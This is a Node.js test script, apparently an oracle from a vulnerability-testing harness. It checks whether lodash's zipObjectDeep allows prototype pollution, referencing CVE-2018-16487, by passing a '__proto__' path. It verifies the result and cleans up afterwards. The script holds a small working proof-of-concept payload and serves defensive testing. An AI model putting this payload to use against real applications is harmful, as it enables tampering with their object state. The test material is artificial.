'use strict';

function main() {
  let _;
  try {
    _ = require('lodash');
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Module resolution failed: ' + String(e && e.message)
    }));
    return;
  }

  const marker = 'oracle_' + process.pid + '_' + Date.now();

  // Benign operation: prove zipObjectDeep works normally for legitimate data.
  let benignOk = false;
  try {
    const result = _.zipObjectDeep(['a.b', 'a.c'], [1, 2]);
    benignOk = result && result.a && result.a.b === 1 && result.a.c === 2;
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign zipObjectDeep operation failed: ' + String(e && e.message)
    }));
    return;
  }

  if (!benignOk) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign zipObjectDeep operation produced unexpected result'
    }));
    return;
  }

  const operation_completed = true; // benign op succeeded, so setup is proven good
  let exploit_succeeded = false;
  let evidence = '';

  try {
    // Clean slate for our marker key on Object.prototype.
    delete Object.prototype[marker];

    // CVE-2018-16487 (variant): lodash.zipObjectDeep in versions <=4.17.11
    // fails to guard against '__proto__' path segments when building nested
    // paths from attacker-controlled keys, allowing prototype pollution.
    // This mirrors a realistic scenario where untrusted input (e.g. a list of
    // path strings derived from user input) is used to build an object.
    const maliciousPaths = ['__proto__.' + marker];
    const maliciousValues = ['polluted'];

    _.zipObjectDeep(maliciousPaths, maliciousValues);

    const pollutedValue = ({}).hasOwnProperty.call(Object.prototype, marker)
      ? Object.prototype[marker]
      : undefined;

    if (pollutedValue === 'polluted') {
      exploit_succeeded = true;
      evidence = 'Object.prototype.' + marker + ' was set to "polluted" via lodash.zipObjectDeep with __proto__ path';
    } else {
      exploit_succeeded = false;
      evidence = 'Object.prototype.' + marker + ' was not polluted after zipObjectDeep call; value=' + String(pollutedValue);
    }
  } catch (e) {
    // An exception during the malicious call, after benign success, counts as blocked.
    exploit_succeeded = false;
    evidence = 'Malicious zipObjectDeep call threw (treated as blocked): ' + String(e && e.message);
  } finally {
    // Clean up any pollution we may have introduced.
    try {
      delete Object.prototype[marker];
    } catch (cleanupErr) {
      // ignore cleanup errors
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed,
    exploit_succeeded,
    evidence
  }));
}

main();
